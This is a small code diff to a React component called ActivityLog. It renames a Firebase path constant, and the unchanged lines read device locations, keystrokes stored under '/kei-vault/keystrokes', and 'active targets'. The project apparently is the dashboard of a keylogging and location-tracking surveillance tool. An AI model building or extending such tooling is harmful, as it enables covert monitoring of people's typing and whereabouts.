@@ -42,7 +42,7 @@ export default function ActivityLog({ targetId }: ActivityLogProps) {
 
     setLoading(true);
 
-    const locationRef = ref(database, FIREBASE_PATHS.DEVICE_LOCATIONS);
+    const locationRef = ref(database, FIREBASE_PATHS.LOCATIONS);
     const keystrokeRef = ref(database, '/kei-vault/keystrokes');
     const activeTargetRef = ref(database, FIREBASE_PATHS.ACTIVE_TARGETS);
 
